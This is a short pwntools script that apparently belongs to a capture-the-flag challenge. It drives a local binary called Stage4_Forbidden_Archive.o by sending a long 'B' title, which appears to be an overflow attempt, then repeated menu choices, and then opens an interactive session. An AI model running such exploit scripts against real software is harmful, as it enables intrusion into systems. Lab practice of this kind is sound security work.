from pwn import *
context.log_level = 'debug'

r = process('./Stage4_Forbidden_Archive.o')

r.recvuntil(b"User name: ")
name = b"A"
r.send(name)

r.recvuntil(b"Book title to borrow: ")
book =  b"B" * 40
r.send(book)

r.recvuntil(b"Choice: ")
for i in range(0,5):
    r.sendline(b'2')
r.interactive()